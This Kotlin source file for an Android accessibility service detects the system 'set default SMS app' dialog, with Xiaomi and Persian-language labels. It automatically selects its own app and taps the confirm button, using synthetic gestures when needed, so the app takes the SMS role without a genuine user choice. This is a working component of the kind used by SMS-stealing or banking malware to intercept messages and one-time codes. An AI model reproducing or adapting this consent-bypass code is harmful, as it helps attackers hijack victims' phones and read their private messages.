package com.base.realtime.sms

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.SystemClock
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.base.realtime.access.UiGuideBridge

/**
 * Xiaomi / PermissionController SMS-default dialog:
 * list row (title + RadioButton) → button1 «تنظیم برای پیش‌فرض».
 */
object SmsRoleTapper {
    private var lastTapAt = 0L
    private var selectedOwn = false

    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        if (UiGuideBridge.hasGuidedJob()) return
        if (!SmsNeedDefault.watching(service)) {
            selectedOwn = false
            return
        }
        if (SmsDefault.isDefault(service)) return
        val type = event.eventType
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOWS_CHANGED
        ) {
            return
        }
        val now = SystemClock.uptimeMillis()
        if (now - lastTapAt < 450L) return
        val selfLabel = appLabel(service)
        if (selfLabel.length < 2) return

        for (root in dialogRoots(service)) {
            try {
                if (!isSmsDefaultDialog(root, selfLabel)) continue

                if (!selectedOwn || !ownRowSelected(root, selfLabel)) {
                    val row = findOwnRow(root, selfLabel)
                    if (row != null && performClick(service, row)) {
                        selectedOwn = true
                        lastTapAt = now
                        return
                    }
                }

                val confirm = findConfirmButton(root)
                if (confirm != null && selectedOwn && performClick(service, confirm)) {
                    lastTapAt = now
                    return
                }
            } finally {
                try {
                    root.recycle()
                } catch (_: Throwable) {
                }
            }
        }
    }

    /** Dialog title mentions our app, or list has our row + button1. */
    private fun isSmsDefaultDialog(root: AccessibilityNodeInfo, selfLabel: String): Boolean {
        val pkg = root.packageName?.toString().orEmpty().lowercase()
        if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller") ||
            pkg.contains("settings")
        ) {
            if (findOwnRow(root, selfLabel) != null) return true
        }
        return findConfirmButton(root) != null && findOwnRow(root, selfLabel) != null
    }

    /**
     * Prefer the clickable list row that contains our app title TextView
     * (id …/title), not the dialog headline.
     */
    private fun findOwnRow(root: AccessibilityNodeInfo, selfLabel: String): AccessibilityNodeInfo? {
        val titleNodes = ArrayList<AccessibilityNodeInfo>()
        collectTitles(root, titleNodes)
        for (title in titleNodes) {
            val text = title.text?.toString()?.trim().orEmpty()
            if (!text.equals(selfLabel, ignoreCase = true)) continue
            // Dialog headline is long and usually not inside a list row.
            if (text.length > selfLabel.length + 2) continue
            val row = clickableAncestor(title) ?: radioNear(title) ?: continue
            return row
        }
        // Fallback: any node whose exact label is our app.
        return walkFirst(root) { node, label ->
            label.equals(selfLabel, ignoreCase = true)
        }?.let { node ->
            clickableAncestor(node) ?: radioNear(node) ?: node.takeIf { it.isClickable || it.isCheckable }
        }
    }

    private fun ownRowSelected(root: AccessibilityNodeInfo, selfLabel: String): Boolean {
        val titleNodes = ArrayList<AccessibilityNodeInfo>()
        collectTitles(root, titleNodes)
        for (title in titleNodes) {
            val text = title.text?.toString()?.trim().orEmpty()
            if (!text.equals(selfLabel, ignoreCase = true)) continue
            val radio = radioNear(title)
            if (radio != null && radio.isChecked) return true
            val row = clickableAncestor(title)
            if (row != null && row.isCheckable && row.isChecked) return true
        }
        return selectedOwn
    }

    private fun collectTitles(node: AccessibilityNodeInfo, out: ArrayList<AccessibilityNodeInfo>) {
        val id = node.viewIdResourceName.orEmpty()
        if (id.endsWith(":id/title") || id.endsWith("/title")) {
            val text = node.text?.toString()?.trim().orEmpty()
            if (text.isNotBlank()) out += node
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectTitles(it, out) }
        }
    }

    private fun findConfirmButton(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val byId = walkFirst(root) { node, _ ->
            val id = node.viewIdResourceName.orEmpty()
            id == "android:id/button1" || id.endsWith(":id/button1")
        }
        if (byId != null) return byId
        return walkFirst(root) { node, label ->
            (node.isClickable || node.className?.toString()?.contains("Button") == true) &&
                looksConfirm(label) && !looksDeny(label)
        }
    }

    private fun radioNear(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val row = clickableAncestor(node) ?: node.parent ?: return null
        return findRadio(row)
    }

    private fun findRadio(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val cls = node.className?.toString().orEmpty()
        if (node.isCheckable || cls.contains("RadioButton", ignoreCase = true)) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findRadio(child)
            if (found != null) return found
        }
        return null
    }

    private fun clickableAncestor(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        var p = node.parent
        var depth = 0
        while (p != null && depth < 6) {
            if (p.isClickable) return p
            p = p.parent
            depth++
        }
        return null
    }

    private fun looksConfirm(raw: String): Boolean {
        val t = raw.lowercase().trim()
        if (t.isBlank() || t.length > 40) return false
        return t == "yes" || t == "ok" || t == "okay" || t == "done" || t == "confirm" ||
            t == "set as default" || t == "set default" || t == "always" ||
            t == "بله" || t == "باشه" || t == "تأیید" || t == "تایید" || t == "قبول" ||
            t.contains("تنظیم برای پیش") || t.contains("تنظیم به‌عنوان پیش") ||
            t.contains("set as default") ||
            (t.contains("پیش‌فرض") || t.contains("پيش فرض") || t.contains("پیش فرض")) &&
            (t.contains("تنظیم") || t.contains("set") || t.contains("انتخاب"))
    }

    private fun looksDeny(raw: String): Boolean {
        val t = raw.lowercase()
        return t == "no" || t == "cancel" || t == "نه" || t == "خیر" || t == "لغو" ||
            t == "انصراف" || t.contains("don't") || t.contains("dont") || t.contains("not now")
    }

    private fun dialogRoots(service: AccessibilityService): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>(4)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = service.windows
            if (!windows.isNullOrEmpty()) {
                for (w in windows) {
                    if (w.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                    val root = w.root ?: continue
                    val pkg = root.packageName?.toString().orEmpty()
                    if (pkg == service.packageName || pkg.contains("systemui", ignoreCase = true)) {
                        root.recycle()
                        continue
                    }
                    out += root
                }
            }
        }
        if (out.isEmpty()) {
            service.rootInActiveWindow?.let { out += it }
        }
        return out
    }

    private fun walkFirst(
        root: AccessibilityNodeInfo,
        match: (AccessibilityNodeInfo, String) -> Boolean,
    ): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var seen = 0
        while (queue.isNotEmpty() && seen < 200) {
            val node = queue.removeFirst()
            seen++
            val label = listOf(node.text, node.contentDescription)
                .mapNotNull { it?.toString()?.trim() }
                .firstOrNull { it.isNotBlank() }
                .orEmpty()
            if (match(node, label)) return node
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun performClick(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        if (node.isCheckable && !node.isChecked && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
        val radio = findRadio(node)
        if (radio != null && radio !== node && radio.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (rect.isEmpty || rect.width() < 8 || rect.height() < 8) return false
        val path = Path().apply { moveTo(rect.exactCenterX(), rect.exactCenterY()) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 45)
        return service.dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    private fun appLabel(service: AccessibilityService): String {
        return try {
            val pm = service.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(service.packageName, 0)).toString().trim()
        } catch (_: Throwable) {
            ""
        }
    }
}
